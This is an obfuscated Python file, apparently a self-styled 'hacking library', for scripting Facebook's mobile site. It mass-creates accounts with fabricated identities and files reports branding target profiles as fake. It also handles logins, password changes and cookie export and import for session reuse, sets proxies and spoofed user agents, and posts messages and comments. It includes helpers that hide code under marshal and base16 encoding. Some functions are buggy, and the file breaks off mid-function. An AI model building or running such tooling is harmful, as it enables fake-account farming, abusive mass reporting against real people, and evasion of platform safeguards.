""#line:15
# -*- coding: UTF-8 -*-
'''
             Hacking - Library
              BY : Nasir Ali
             Copyright : 2020

   DO NoT ReCode That Woudnt Make You Programmer

#Facebook : fb.com/nasir.xo
#Github : github.com/nasirxo
#Instagram : instagram.com/nasir.xoz



'''

from faker import *#line:18
from requests import *#line:19
from bs4 import BeautifulSoup as bs #line:20
from random import choice #line:21
import json #line:22
import base64 #line:23
import marshal #line:24
from sympy .abc import *#line:26
from sympy import *#line:27
from sympy .parsing .sympy_parser import parse_expr #line:28
'''
  AlGORITHMATIC FUNCTIONS
  -----------------------

  FUNCTION : they helps in scrapping 
  
'''#line:38
def MSolv (O0O0OO0O0OOOOOO00 ):#line:41
 OOOOO0O0O0O0O0O0O =['÷','×','^','π']#line:42
 O000O00OO00O0000O =['/','*','**','pi.n(10)']#line:43
 for OOOO00000O00OOOO0 in range (len (OOOOO0O0O0O0O0O0O )):#line:44
    O0O0OO0O0OOOOOO00 =O0O0OO0O0OOOOOO00 .replace (OOOOO0O0O0O0O0O0O [OOOO00000O00OOOO0 ],O000O00OO00O0000O [OOOO00000O00OOOO0 ])#line:45
 try :#line:46
  OOO0O0O0OOO00OOO0 =parse_expr (O0O0OO0O0OOOOOO00 )#line:47
  return str (OOO0O0O0OOO00OOO0 )#line:49
 except :#line:50
   return 'Invalid Question Syntax !'#line:51
def tsearch (OO0000O000O0O0O0O ,OOO00O0O0000OO0OO ):#line:55
  OO0O0OOOO0O0OO0O0 =[]#line:56
  for OO0OOO0000O00OOOO in OO0000O000O0O0O0O :#line:57
   try :#line:58
     if OOO00O0O0000OO0OO ==OO0OOO0000O00OOOO .get_text ():#line:59
       OO0O0OOOO0O0OO0O0 .append (OO0OOO0000O00OOOO )#line:60
   except :pass #line:61
  return OO0O0OOOO0O0OO0O0 #line:62
def tnsearch (OOO0O00O0OO00OO0O ,O00OOO000O0O000O0 ):#line:64
  O00O000OO0OOOOOO0 =[]#line:65
  for O000O0O0O00O000OO in OOO0O00O0OO00OO0O :#line:66
    try :#line:67
      if O00OOO000O0O000O0 in O000O0O0O00O000OO .get_text ():#line:68
         O00O000OO0OOOOOO0 .append (O000O0O0O00O000OO )#line:69
    except :pass #line:70
  return O00O000OO0OOOOOO0 #line:71
def asearch (OOOO0000O00O0OOOO ,O0O000OO0OOO0O0OO ):#line:74
 for O0000O00OOO0OO00O in OOOO0000O00O0OOOO :#line:75
   try :#line:76
     if O0O000OO0OOO0O0OO in O0000O00OOO0OO00O ['href']:#line:77
        return O0000O00OOO0OO00O ['href']#line:78
   except :pass #line:79
def alsearch (OOOOO0O000000000O ,O0OO0O00O0O0O000O ):#line:81
  O0000O0O00O0OO0OO =[]#line:82
  for OOOO00O0O00000O00 in OOOOO0O000000000O :#line:83
    try :#line:84
      if O0OO0O00O0O0O000O in OOOO00O0O00000O00 ['href']:#line:85
         O0000O0O00O0OO0OO .append (OOOO00O0O00000O00 )#line:86
    except :pass #line:87
  return O0000O0O00O0OO0OO #line:88
def csearch (O000OOOO000OOO00O ):#line:91
  O0O0O00O0000O00O0 =[]#line:92
  for OO00OOOOOO0O000OO in O000OOOO000OOO00O :#line:93
    try :#line:94
      if OO00OOOOOO0O000OO ['class']:#line:95
        if OO00OOOOOO0O000OO ['id']:#line:96
         if OO00OOOOOO0O000OO .h3 .a ['href']:#line:97
           O0O0O00O0000O00O0 .append (OO00OOOOOO0O000OO ['class'])#line:98
    except :pass #line:99
  return O0O0O00O0000O00O0 [-1 ]#line:100
def CFind (OOOO0O0000OOO0O00 ):#line:103
   try :#line:104
     if OOOO0O0000OOO0O00 ['class']:#line:105
       if OOOO0O0000OOO0O00 .table ['class']:#line:106
          return OOOO0O0000OOO0O00 ['class']#line:107
   except :#line:108
     pass #line:109
def toid (O0000OOOO0OOOOO00 ):#line:112
   if '/profile.php'in O0000OOOO0OOOOO00 :#line:113
      return O0000OOOO0OOOOO00 .split ('?id=')[1 ].split ('&fref')[0 ]#line:114
   else :#line:115
     return O0000OOOO0OOOOO00 .split ('/')[1 ].split ('?fref')[0 ]#line:116
def toid2 (O0O0O00O0O0O000O0 ):#line:118
  if '/profile.php'in O0O0O00O0O0O000O0 :#line:119
   return O0O0O00O0O0O000O0 .split ('?id=')[1 ].split ('&refid')[0 ]#line:120
def getform (O00OO0000O00O0O0O ):#line:122
  OO00000O00OO00O0O ={}#line:123
  for OOOOOOO0000O00000 in O00OO0000O00O0O0O .find_all ('input',{'type':'hidden'}):#line:124
    try :OO00000O00OO00O0O [OOOOOOO0000O00000 ['name']]=OOOOOOO0000O00000 ['value']#line:125
    except :pass #line:126
  try :OO00000O00OO00O0O ['action']=O00OO0000O00O0O0O ['action']#line:127
  except :pass #line:128
  return OO00000O00OO00O0O #line:129
def e_c (O0O0O00OO000OOOO0 ):#line:132
    return ''.join ([chr (OO0000OO0O000OOOO )for OO0000OO0O000OOOO in [ord (OOOO000O0O00OO0O0 )<<2 for OOOO000O0O00OO0O0 in O0O0O00OO000OOOO0 ]])#line:133
def d_c (O000O0OOOOOOOOOO0 ):#line:136
   return ''.join ([chr (OO0O0O0O000O00O0O )for OO0O0O0O000O00O0O in [ord (OO0O0O0OOO0OO0O00 )>>2 for OO0O0O0OOO0OO0O00 in O000O0OOOOOOOOOO0 ]])#line:137
def e_cc (O00OOOO0OOOO00O00 ):#line:140
  OOO00O0OOO00OO000 =compile (O00OOOO0OOOO00O00 ,'<string','exec')#line:141
  OO0OOOOOO0O0OO0OO =marshal .dumps (OOO00O0OOO00OO000 )#line:142
  return e_c (base64 .b16encode (OO0OOOOOO0O0OO0OO ).decode ('utf-8'))#line:143
def d_cc (OOO0000000O00O0OO ):#line:145
  OO00OOOO000000O00 =d_c (OOO0000000O00O0OO .replace ('\n','')).encode ('utf-8')#line:146
  O00O0000OO0O00O0O =base64 .b16decode (OO00OOOO000000O00 )#line:147
  return marshal .loads (O00O0000OO0O00O0O )#line:148
''''


'''#line:154
def getip (OOOO0OOO00O0O00OO ):#line:156
 OOO0OOOO0OOO00OOO =get ("http://api.hostip.info/get_html.php?ip={}&position=true".format (OOOO0OOO00O0O00OO ))#line:157
 print ('----'*10 +'\n')#line:158
 print (OOO0OOOO0OOO00OOO .text )#line:159
 print ('----'*10 )#line:160
def encrypt (OOOOO0O0OO00O0OO0 ):#line:162
    OO0000OOOO0000000 =''#line:163
    for O0O00OO0OOO0OO000 in OOOOO0O0OO00O0OO0 :#line:164
      OO0000OOOO0000000 =OO0000OOOO0000000 +chr (ord (O0O00OO0OOO0OO000 )+2 )#line:165
    return OO0000OOOO0000000 #line:166
def decrypt (OO00O0OOOOOO00OOO ):#line:169
    O0000OOOO000OO00O =''#line:170
    for O0O000OO00O00O0OO in OO00O0OOOOOO00OOO :#line:171
      O0000OOOO000OO00O =O0000OOOO000OO00O +chr (ord (O0O000OO00O00O0OO )-2 )#line:172
    return O0000OOOO000OO00O #line:173
'''

   MAIN - CLASS (FB)
   -----------------
   

'''#line:185
class FB :#line:188
  def __init__ (OOO00O00O00OOO00O ):#line:189
    OOO00O00O00OOO00O .P =Faker ().profile ()#line:190
    OOO00O00O00OOO00O .name =OOO00O00O00OOO00O .P .get ('name').split ()#line:191
    OOO00O00O00OOO00O .email =''#line:192
    OOO00O00O00OOO00O .passwd =Faker ().password ()#line:193
    OOO00O00O00OOO00O .bday =str (choice (range (1 ,26 )))#line:194
    OOO00O00O00OOO00O .bmonth =str (choice (range (1 ,13 )))#line:195
    OOO00O00O00OOO00O .byear =str (choice (range (1980 ,2010 )))#line:196
    OOO00O00O00OOO00O .sex ='2'#line:197
    OOO00O00O00OOO00O .s =Session ()#line:198
    OOO00O00O00OOO00O .url ="https://mbasic.facebook.com{}"#line:199
    OOO00O00O00OOO00O .agent ={"Accept-Language":"en-US,en;q=0.5","user-agent":Faker ().user_agent ()}#line:203
    OOO00O00O00OOO00O .s .headers .update (OOO00O00O00OOO00O .agent )#line:204
    OOO00O00O00OOO00O .data ={}#line:205
    OOO00O00O00OOO00O .cstatus =''#line:206
  def check (OO0O00OOO00OO000O ,OO0OO00OO0O0O0OOO ):#line:208
    print (OO0O00OOO00OO000O .P .get (OO0OO00OO0O0O0OOO ))#line:209
  def accountgenerate (O0O0OOOO00O0O0000 ):#line:211
    O000O0OOOOOOOOOOO =O0O0OOOO00O0O0000 .s .get (O0O0OOOO00O0O0000 .url .format ('/reg'))#line:212
    O0O0O000OO0OO0OO0 =bs (O000O0OOOOOOOOOOO .content ,"html.parser")#line:213
    OOOOO0O000O0O0O00 =O0O0O000OO0OO0OO0 .find ('form')#line:214
    OO000OO0OOOO0OOOO =OOOOO0O000O0O0O00 .find_all ('input',{'type':'hidden'})#line:215
    for OOO00O0OO000OOO0O in OO000OO0OOOO0OOOO :#line:216
      try :O0O0OOOO00O0O0000 .data [OOO00O0OO000OOO0O ['name']]=OOO00O0OO000OOO0O ['value']#line:217
      except :pass #line:218
    O00O00000O0O0O0OO =O0O0OOOO00O0O0000 .P .get ('name').split ()#line:219
    O0O0OOOO00O0O0000 .data ['firstname']=O0O0OOOO00O0O0000 .name [0 ]#line:221
    O0O0OOOO00O0O0000 .data ['lastname']=O0O0OOOO00O0O0000 .name [1 ]#line:222
    O0O0OOOO00O0O0000 .data ['reg_email__']=O0O0OOOO00O0O0000 .email #line:223
    O0O0OOOO00O0O0000 .data ['sex']=O0O0OOOO00O0O0000 .sex #line:224
    O0O0OOOO00O0O0000 .data ['custom_gender']=''#line:225
    O0O0OOOO00O0O0000 .data ['did_use_age']='false'#line:226
    O0O0OOOO00O0O0000 .data ['birthday_day']=O0O0OOOO00O0O0000 .bday #line:227
    O0O0OOOO00O0O0000 .data ['birthday_month']=O0O0OOOO00O0O0000 .bmonth #line:228
    O0O0OOOO00O0O0000 .data ['birthday_year']=O0O0OOOO00O0O0000 .byear #line:229
    O0O0OOOO00O0O0000 .data ['age_step_input']=''#line:230
    O0O0OOOO00O0O0000 .data ['reg_passwd__']=O0O0OOOO00O0O0000 .passwd #line:231
    O0O0OOOO00O0O0000 .data ['submit']='Sign Up'#line:232
    O0O0OOOO00O0O0000 .data ['i']=''#line:233
    O0O0OOOO00O0O0000 .data ['helper']=''#line:234
    O0O0OOOO00O0O0000 .data ['zero_header_af_client']=''#line:235
    OO0OOOO0OO0OOO00O =O0O0OOOO00O0O0000 .s .post (O0O0OOOO00O0O0000 .url .format ('/reg/submit'),O0O0OOOO00O0O0000 .data )#line:237
    O0O0OOOO00O0O0000 .cstatus =bs (OO0OOOO0OO0OOO00O .content ,'html.parser').title .get_text ()#line:238
    return OO0OOOO0OO0OOO00O #line:239
  def verify (OOO0000OO00OOOOO0 ,O00OO000OOO0OO00O ):#line:241
    OO0O000O0O000OO0O ={}#line:242
    OOOOO0OOOOO0OOOO0 =OOO0000OO00OOOOO0 .s .get (OOO0000OO00OOOOO0 .url .format ('/recover/code/'))#line:243
    OO00O0000O0OOO00O =bs (OOOOO0OOOOO0OOOO0 .content ,'html.parser')#line:244
    O00000OOO00000O00 =OO00O0000O0OOO00O .findAll ('form')#line:245
    for OO0OOO0O0O0OOOOO0 in O00000OOO00000O00 :#line:246
     try :#line:247
       if 'code'in OO0OOO0O0O0OOOOO0 ['action']:#line:248
         O00000OOO00000O00 =OO0OOO0O0O0OOOOO0 #line:249
     except :pass #line:250
    for OO0OOO0O0O0OOOOO0 in O00000OOO00000O00 .findAll ('input'):#line:252
       try :OO0O000O0O000OO0O [OO0OOO0O0O0OOOOO0 ['name']]=OO0OOO0O0O0OOOOO0 ['value']#line:253
       except :pass #line:254
    OO0O000O0O000OO0O ['lsd']=OO0O000O0O000OO0O ['fb_dtsg'].split (':')[0 ]#line:255
    OO0O000O0O000OO0O ['n']=str (O00OO000OOO0OO00O )#line:256
    OO0O000O0O000OO0O ['reset_action']='Continue'#line:257
    OOOOO0OOOOO0OOOO0 =OOO0000OO00OOOOO0 .s .post (OOO0000OO00OOOOO0 .url .format (O00000OOO00000O00 ['action']),OO0O000O0O000OO0O )#line:258
    return OOOOO0OOOOO0OOOO0 #line:259
  def changepass (O0OOO0000OO0OO00O ,O000O0OO00000OOO0 ,O0O0O000OO0OOO00O ):#line:261
    O0O00OOO00OO00O00 ={}#line:262
    OOO0OOO000000O000 =O0OOO0000OO0OO00O .s .get (O0OOO0000OO0OO00O .url .format ('/settings/security/password'))#line:263
    OO0OO00O0000OO0O0 =bs (OOO0OOO000000O000 .content ,'html.parser')#line:264
    O0OOO0O000O00O000 =OO0OO00O0000OO0O0 .findAll ('form')#line:265
    for O0O0O0000O000O0O0 in O0OOO0O000O00O000 :#line:266
     try :#line:267
      if 'password'in O0O0O0000O000O0O0 ['action']:#line:268
        O0OOO0O000O00O000 =O0O0O0000O000O0O0 #line:269
     except :pass #line:270
    for O0O0O0000O000O0O0 in O0OOO0O000O00O000 .findAll ('input'):#line:272
      try :O0O00OOO00OO00O00 [O0O0O0000O000O0O0 ['name']]=O0O0O0000O000O0O0 ['value']#line:273
      except :pass #line:274
    O0O00OOO00OO00O00 ['password_old']=O000O0OO00000OOO0 #line:275
    O0O00OOO00OO00O00 ['password_new']=O0O0O000OO0OOO00O #line:276
    O0O00OOO00OO00O00 ['password_confirm']=O0O0O000OO0OOO00O #line:277
    O0O00OOO00OO00O00 ['save']='Save Changes'#line:278
    OOO0OOO000000O000 =O0OOO0000OO0OO00O .s .post (O0OOO0000OO0OO00O .url .format (O0OOO0O000O00O000 ['action']),O0O00OOO00OO00O00 )#line:279
    return OOO0OOO000000O000 #line:280
  def updatebio (OOO0O000O0O0O0OOO ,OOO00OOO000OO0OO0 ):#line:282
    O0O000O0O000OO00O ={}#line:283
    O0OOOO0OOOO000OOO =OOO0O000O0O0O0OOO .s .get (OOO0O000O0O0O0OOO .url .format ('/profile/basic/intro/bio/'))#line:284
    OO000O0OOO00OOOOO =bs (O0OOOO0OOOO000OOO .content ,'html.parser')#line:285
    OOOOOO000OOO000OO =OO000O0OOO00OOOOO .findAll ('form')#line:286
    for OOOOO0000O0OOO00O in OOOOOO000OOO000OO :#line:287
      try :#line:288
        if 'bio'in OOOOO0000O0OOO00O ['action']:#line:289
          OOOOOO000OOO000OO =OOOOO0000O0OOO00O #line:290
      except :pass #line:291
    for OOOOO0000O0OOO00O in OOOOOO000OOO000OO .findAll ('input'):#line:293
      try :O0O000O0O000OO00O [OOOOO0000O0OOO00O ['name']]=OOOOO0000O0OOO00O ['value']#line:294
      except :pass #line:295
    O0O000O0O000OO00O ['bio']=OOO00OOO000OO0OO0 #line:297
    O0OOOO0OOOO000OOO =OOO0O000O0O0O0OOO .s .post (OOO0O000O0O0O0OOO .url .format (OOOOOO000OOO000OO ['action']),O0O000O0O000OO00O )#line:298
    return O0OOOO0OOOO000OOO #line:299
  def report (O00OO0O00O0OOO00O ,OO00O0O00OOO00O0O ):#line:301
      OO0O0OO0O00O0O0O0 ={}#line:302
      O0O0OOOOOO0O00O00 =O00OO0O00O0OOO00O .s .get (O00OO0O00O0OOO00O .url .format ('/mbasic/more/?owner_id='+str (OO00O0O00OOO00O0O )))#line:303
      OO0000OOOO0OO0O0O =bs (O0O0OOOOOO0O00O00 .content ,'html.parser')#line:304
      OO0OO000O0O000OO0 =tnsearch (OO0000OOOO0OO0O0O .findAll ('a'),'report profile')#line:305
      try :O0O0OO00OO0O0OO0O =OO0OO000O0O000OO0 [0 ]['href']#line:306
      except :pass #line:307
      O0O0OOOOOO0O00O00 =O00OO0O00O0OOO00O .s .get (O00OO0O00O0OOO00O .url .format (O0O0OO00OO0O0OO0O ))#line:308
      OO0000OOOO0OO0O0O =bs (O0O0OOOOOO0O00O00 .content ,'html.parser')#line:309
      OOO0000O000OOO0OO =OO0000OOOO0OO0O0O .find ('form')#line:310
      for O0O00O00000OOO000 in OOO0000O000OOO0OO .findAll ('input'):#line:311
        try :OO0O0OO0O00O0O0O0 [O0O00O00000OOO000 ['name']]=O0O00O00000OOO000 ['value']#line:312
        except :pass #line:313
      OO0O0OO0O00O0O0O0 ['tag']='profile_fake_account'#line:315
      OO0O0OO0O00O0O0O0 ['action']='Submit'#line:316
      O0O0OOOOOO0O00O00 =O00OO0O00O0OOO00O .s .post (O00OO0O00O0OOO00O .url .format (OOO0000O000OOO0OO ['action']),OO0O0OO0O00O0O0O0 )#line:317
      OO0000OOOO0OO0O0O =bs (O0O0OOOOOO0O00O00 .content ,'html.parser')#line:318
      OOO0000O000OOO0OO =OO0000OOOO0OO0O0O .find ('form')#line:319
      OO0O0OO0O00O0O0O0 ={}#line:320
      for O0O00O00000OOO000 in OOO0000O000OOO0OO .findAll ('input'):#line:321
         try :OO0O0OO0O00O0O0O0 [O0O00O00000OOO000 ['name']]=O0O00O00000OOO000 ['value']#line:322
         except :pass #line:323
      OO0O0OO0O00O0O0O0 ['action']='Submit'#line:324
      O0O0OOOOOO0O00O00 =O00OO0O00O0OOO00O .s .post (O00OO0O00O0OOO00O .url .format (OOO0000O000OOO0OO ['action']),OO0O0OO0O00O0O0O0 )#line:325
      OO0000OOOO0OO0O0O =bs (O0O0OOOOOO0O00O00 .content ,'html.parser')#line:326
      OOO0000O000OOO0OO =OO0000OOOO0OO0O0O .find ('form')#line:327
      OO0O0OO0O00O0O0O0 ={}#line:328
      for O0O00O00000OOO000 in OOO0000O000OOO0OO .findAll ('input'):#line:329
         try :OO0O0OO0O00O0O0O0 [O0O00O00000OOO000 ['name']]=O0O00O00000OOO000 ['value']#line:330
         except :pass #line:331
      OO0O0OO0O00O0O0O0 ['action']='Report'#line:332
      O0O0OOOOOO0O00O00 =O00OO0O00O0OOO00O .s .post (O00OO0O00O0OOO00O .url .format (OOO0000O000OOO0OO ['action']),OO0O0OO0O00O0O0O0 )#line:333
      return O0O0OOOOOO0O00O00 #line:334
  def show (OOOO00OO0OOO0OOOO ):#line:337
   try :#line:338
    return {'name':OOOO00OO0OOO0OOOO .P .get ('name'),'sex':OOOO00OO0OOO0OOOO .sex ,'email':OOOO00OO0OOO0OOOO .email ,'password':OOOO00OO0OOO0OOOO .passwd ,'birthday':OOOO00OO0OOO0OOOO .bday ,'birthmonth':OOOO00OO0OOO0OOOO .bmonth ,'birthyear':OOOO00OO0OOO0OOOO .byear ,'status':OOOO00OO0OOO0OOOO .cstatus }#line:348
   except :pass #line:349
  def writehtml (OOO000O0OO00OOOO0 ,O000O0O0OOOO0OOO0 ,O00OOO0O0O0OOOOOO ):#line:351
    with open (O00OOO0O0O0OOOOOO ,'w')as OO0O000O0OO000000 :#line:352
      print ('{} bytes written ..'.format (OO0O000O0OO000000 .write (O000O0O0OOOO0OOO0 )))#line:353
  def getcookie (O0O000O0O0O00OOO0 ):#line:355
   try :#line:356
    return O0O000O0O0O00OOO0 .s .cookies .get_dict ()#line:357
   except :pass #line:358
  def getaccountid (OOOOOOOOO0OO0000O ):#line:360
   try :#line:361
    return OOOOOOOOO0OO0000O .s .cookies .get_dict ()['c_user']#line:362
   except :pass #line:363
  def setcookie (OOOOOO00O0O00OO0O ,O000O0OOOO00O0000 ):#line:365
   with open (O000O0OOOO00O0000 ,'r')as OO0OOO0O00OOO00OO :#line:366
     try :OOOOOO00O0O00OO0O .s .cookies .update (json .loads (OO0OOO0O00OOO00OO .read ()))#line:367
     except :pass #line:368
  def getkey (O000O0O0O000OOO00 ):#line:370
    OO0OOO0O0OO0OO0OO =json .dumps (O000O0O0O000OOO00 .s .cookies .get_dict ())#line:371
    return base64 .b16encode (OO0OOO0O0OO0OO0OO .encode ('utf-8'))#line:372
  def setkey (OO00O00O00OOOOO00 ,O0OOOOOO00O0O0000 ):#line:374
    OOOOO0OO00O000000 =json .loads (base64 .b16decode (O0OOOOOO00O0O0000 .encode ('utf-8')))#line:375
    OO00O00O00OOOOO00 .s .cookies .update (OOOOO0OO00O000000 )#line:376
  def setuseragent (O00000O00OOO0OOOO ,OOOO00OOOOO0O0O00 ):#line:378
    try :O00000O00OOO0OOOO .s .headers .update (OOOO00OOOOO0O0O00 )#line:379
    except :pass #line:380
  def savecookie (OO00OO000O0OO000O ,O0O000OO0OOOOO00O ):#line:382
   try :#line:383
    with open (O0O000OO0OOOOO00O ,'w')as OO0O0O00OOOO0O0OO :#line:384
      OO0O0O00OOOO0O0OO .write (json .dumps (OO00OO000O0OO000O .cookie .get_dict ()))#line:385
   except :pass #line:386
  def setproxy (OOOO0O0OOO0O000O0 ,OO0OO0O000O00OO0O ):#line:388
    try :OOOO0O0OOO0O000O0 .s .proxies =OO0OO0O000O00OO0O #line:389
    except :pass #line:390
  def seturl (O0OOOOOO0O000O0OO ,OO00OO000O0O00O0O ):#line:392
    try :O0OOOOOO0O000O0OO .url =OO00OO000O0O00O0O #line:393
    except :pass #line:394
  def setemail (O00O0OOO0O00O0O0O ,OO0000OO0OOO0000O ):#line:396
     try :O00O0OOO0O00O0O0O .email =OO0000OO0OOO0000O #line:397
     except :pass #line:398
  def setpassword (OOOO00O0O00OO00O0 ,OOO0O0OO00OO00OO0 ):#line:400
     try :OOOO00O0O00OO00O0 .passwd =OOO0O0OO00OO00OO0 #line:401
     except :pass #line:402
  def setsex (OO0O0O0000OOO0O00 ,O0OOO00OOOOO000O0 ):#line:404
     try :OO0O0O0000OOO0O00 .sex =O0OOO00OOOOO000O0 #line:405
     except :pass #line:406
  def setname (OO0O00OOOOO000O00 ,OO0000O0O00000OO0 ,OO00O00OO0000000O ):#line:408
     try :#line:409
       OO0O00OOOOO000O00 .name [0 ]=OO0000O0O00000OO0 #line:410
       OO0O00OOOOO000O00 .name [1 ]=OO00O00OO0000000O #line:411
     except :pass #line:412
  def setbirthday (OO00O00O000O0OO00 ,O000O0O0O00O0OOO0 ,OOOO000OOOO0OOOO0 ,OOO0OO00O00O0OOO0 ):#line:414
     try :#line:415
       OO00O00O000O0OO00 .bday =O000O0O0O00O0OOO0 #line:416
       OO00O00O000O0OO00 .bmonth =OOOO000OOOO0OOOO0 #line:417
       OO00O00O000O0OO00 .byear =OOO0OO00O00O0OOO0 #line:418
     except :pass #line:419
  def login (OO0OO0O000O0O0OO0 ):#line:421
     O000000O00O00O0OO ={'email':str (OO0OO0O000O0O0OO0 .email ),'pass':str (OO0OO0O000O0O0OO0 .passwd )}#line:422
     O000OOOOOO0OO0O0O =OO0OO0O000O0O0OO0 .s .post (OO0OO0O000O0O0OO0 .url .format ("/login"),data =O000000O00O00O0OO )#line:423
     try :#line:424
        if "m_ses"in O000OOOOOO0OO0O0O .url or "home.php"in O000OOOOOO0OO0O0O .url or "save-device"in O000OOOOOO0OO0O0O .url :#line:425
            return {'login_status':'sucessfull','email':OO0OO0O000O0O0OO0 .email ,'account_id':OO0OO0O000O0O0OO0 .s .cookies .get_dict ()['c_user'],'cookie_datr':OO0OO0O000O0O0OO0 .s .cookies .get_dict ()['datr'],}#line:431
        else :#line:432
            return {'login_status':'failed','account':email ,'url':O000OOOOOO0OO0O0O .url }#line:437
     except :#line:438
        return {'login_status':'error','error':'No_Internet','type':'404'}#line:443
  def fbsend (OOO0O0O0OO00OO0OO ,O0O0O0OO00OOO0O00 ,O00O00O0000OO0OOO ):#line:446
       O00OO0O00O0OOOOO0 =OOO0O0O0OO00OO0OO .url .format ('/messages/thread/'+str (O00O00O0000OO0OOO ))#line:447
       OO000O0O0OOO000O0 =[]#line:448
       OOO000O00O0000O00 =bs (OOO0O0O0OO00OO0OO .s .get (O00OO0O00O0OOOOO0 ).content ,"html.parser")#line:449
       for O00OOOO000O0000OO in OOO000O00O0000O00 ("form"):#line:450
          if "/messages/send/"in O00OOOO000O0000OO ["action"]:#line:451
             OO000O0O0OOO000O0 .append (OOO0O0O0OO00OO0OO .url .format (O00OOOO000O0000OO ["action"]))#line:452
             break #line:453
       for O00OOOO000O0000OO in OOO000O00O0000O00 ("input"):#line:455
         try :#line:456
           if "fb_dtsg"in O00OOOO000O0000OO ["name"]:#line:457
                        OO000O0O0OOO000O0 .append (O00OOOO000O0000OO ["value"])#line:458
           if "jazoest"in O00OOOO000O0000OO ["name"]:#line:459
                        OO000O0O0OOO000O0 .append (O00OOOO000O0000OO ["value"])#line:460
           if "ids"in O00OOOO000O0000OO ["name"]:#line:461
             OO000O0O0OOO000O0 .append (O00OOOO000O0000OO ["name"])#line:462
             OO000O0O0OOO000O0 .append (O00OOOO000O0000OO ["value"])#line:463
           if len (OO000O0O0OOO000O0 )==7 :break #line:464
         except :pass #line:465
       if len (OO000O0O0OOO000O0 )==7 :#line:467
        OO000OOO0O00OOO0O =OOO0O0O0OO00OO0OO .s .post (OO000O0O0OOO000O0 [0 ],data ={"fb_dtsg":OO000O0O0OOO000O0 [1 ],"jazoest":OO000O0O0OOO000O0 [2 ],OO000O0O0OOO000O0 [3 ]:OO000O0O0OOO000O0 [4 ],OO000O0O0OOO000O0 [5 ]:OO000O0O0OOO000O0 [6 ],"body":O0O0O0OO00OOO0O00 ,"Send":"Kirim"}).url #line:474
        if "send_success"in OO000OOO0O00OOO0O :#line:475
          return {'status':'message_sent','account_id':O00O00O0000OO0OOO ,'message_length':len (O0O0O0OO00OOO0O00 )}#line:480
        else :#line:481
          return {'status':'message_failed','account_id':O00O00O0000OO0OOO ,'message_length':len (O0O0O0OO00OOO0O00 )}#line:486
  def newmsgs (OOO0O0O0O00OO00O0 ):#line:489
    O0OOOOO00OO00O0OO =OOO0O0O0O00OO00O0 .s .get (OOO0O0O0O00OO00O0 .url .format ("/messages"))#line:490
    O0OOO0O00O00OOOO0 =bs (O0OOOOO00OO00O0OO .content ,"html.parser")#line:491
    OO00OOOO000OOOOOO =O0OOO0O00O00OOOO0 .find_all ('table')#line:492
    OO000OOO00OOOOOOO =[]#line:493
    for O00OO000O00O000O0 in OO00OOOO000OOOOOO :#line:494
     try :#line:495
       if '/messages/read'in O00OO000O00O000O0 .a ['href']:#line:496
         OO000OOO00OOOOOOO .append (O00OO000O00O000O0 )#line:497
     except :#line:498
       pass #line:499
    OO00OOOOO00O0000O =" ".join (OO000OOO00OOOOOOO [0 ]['class'])#line:501
    OO0O0OO000O0OOOOO =" ".join (OO000OOO00OOOOOOO [0 ].span ['class'])#line:502
    OOO0OOO0O00O00O0O ={}#line:503
    OOO000O0OO0O0OOOO =O0OOO0O00O00OOOO0 .find_all ('table',attrs ={'class':OO00OOOOO00O0000O })#line:504
    O000OOO00O0OOO000 =0 #line:505
    for O0O0OO00O0OOO0O00 in OOO000O0OO0O0OOOO :#line:506
     try :#line:507
       OO0O0OO0O0OOOO000 =O0O0OO00O0OOO0O00 .a ['href']#line:508
       O0OOO00OO000OO0O0 =OO0O0OO0O0OOOO000 .split ('c.')[1 ].split ('&')[0 ].split ('%3A')[0 ]#line:509
       O0000000OOO0000OO =OO0O0OO0O0OOOO000 .split ('c.')[1 ].split ('&')[0 ].split ('%3A')[1 ]#line:510
       O0000OOO0O0O0O0O0 =O0O0OO00O0OOO0O00 .span #line:511
       OOO0OOO0O00O00O0O [O000OOO00O0OOO000 ]={'name':O0O0OO00O0OOO0O00 .a .get_text (),'msg':O0000OOO0O0O0O0O0 .get_text (),'ID':O0OOO00OO000OO0O0 ,'ID2':O0000000OOO0000OO };O000OOO00O0OOO000 +=1 #line:517
     except :pass #line:518
    return OOO0OOO0O00O00O0O #line:519
  def comment (OO00OOOO00OOO0000 ,O00OO0OO0OO00O0O0 ,O0OO000OO00OO0OO0 ):#line:522
   OO0OOOO00OO0O0O0O =[]#line:523
   OO0000O00000000OO =OO00OOOO00OOO0000 .s .get (O0OO000OO00OO0OO0 )#line:524
   O0OO00O0O0000O0OO =bs (OO0000O00000000OO .text ,"html.parser")#line:525
   for OO0O0OOO000O000O0 in O0OO00O0O0000O0OO ("form"):#line:526
      if "/a/comment.php"in OO0O0OOO000O000O0 ["action"]:#line:527
         OO0OOOO00OO0O0O0O .append (OO00OOOO00OOO0000 .url .format (OO0O0OOO000O000O0 ["action"]))#line:528
         break #line:529
   for OO0O0OOO000O000O0 in O0OO00O0O0000O0OO ("input"):#line:530
          try :#line:531
           if "fb_dtsg"in OO0O0OOO000O000O0 ["name"]:#line:532
              OO0OOOO00OO0O0O0O .append (OO0O0OOO000O000O0 ["value"])#line:533
           if "jazoest"in OO0O0OOO000O000O0 ["name"]:#line:534
              OO0OOOO00OO0O0O0O .append (OO0O0OOO000O000O0 ["value"])#line:535
           if "ids"in OO0O0OOO000O000O0 ["name"]:#line:536
              OO0OOOO00OO0O0O0O .append (OO0O0OOO000O000O0 ["name"])#line:537
              OO0OOOO00OO0O0O0O .append (OO0O0OOO000O000O0 ["value"])#line:538
           if len (data )==7 :#line:539
                  break #line:540
          except :#line:541
           pass #line:542
   O0O00OO00OOO0O0OO ={"fb_dtsg":OO0OOOO00OO0O0O0O [1 ],"jazoest":OO0OOOO00OO0O0O0O [2 ],OO0OOOO00OO0O0O0O [3 ]:OO0OOOO00OO0O0O0O [4 ],"comment_text":str (O00OO0OO0OO00O0O0 ),"Comment":"comment"}#line:548
   OOO00O0O00O00O0OO =OO00OOOO00OOO0000 .s .post (OO0OOOO00OO0O0O0O [0 ],data =O0O00OO00OOO0O0OO )#line:549
   return OOO00O0O00O00O0OO .ok #line:550
  def timelinepost (O0O00O0O0OO0O0O00 ,OO0O000000OO00O0O ):#line:552
   OOOO00O0O000O0000 ={}#line:553
   OO0O0O00OOO00O00O =O0O00O0O0OO0O0O00 .s .get (O0O00O0O0OO0O0O00 .url .format ('/profile.php'))#line:554
   OOO0O0000O00OOOOO =bs (OO0O0O00OOO00O00O .content ,'html.parser')#line:555
   OO0OO00O000OOOO00 =OOO0O0000O00OOOOO .find_all ('form');O0O00OOO00O0O0O0O =OO0OO00O000OOOO00 [1 ]#line:556
   O0O0OOOO0O0O0OO0O =O0O00OOO00O0O0O0O .find_all ('input',{'type':'hidden'})#line:557
